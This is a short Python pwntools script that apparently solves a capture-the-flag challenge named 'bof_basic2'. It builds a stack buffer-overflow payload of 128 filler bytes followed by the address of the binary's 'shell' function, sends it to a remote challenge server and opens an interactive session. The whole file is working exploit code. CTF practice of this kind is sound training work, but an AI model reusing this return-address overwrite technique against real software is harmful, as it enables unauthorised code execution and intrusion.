from multiprocessing import context
from pwn import * 

context.log_level = 'debug'

elf = ELF('./bof_basic2')
#p = process('./bof_basic2') # process
p = remote('ctf.j0n9hyun.xyz', 3001) # remote
shell = elf.symbols['shell']

offset = 128
payload = b'A' * offset 
payload += p64(shell)

p.sendline(payload)
p.interactive()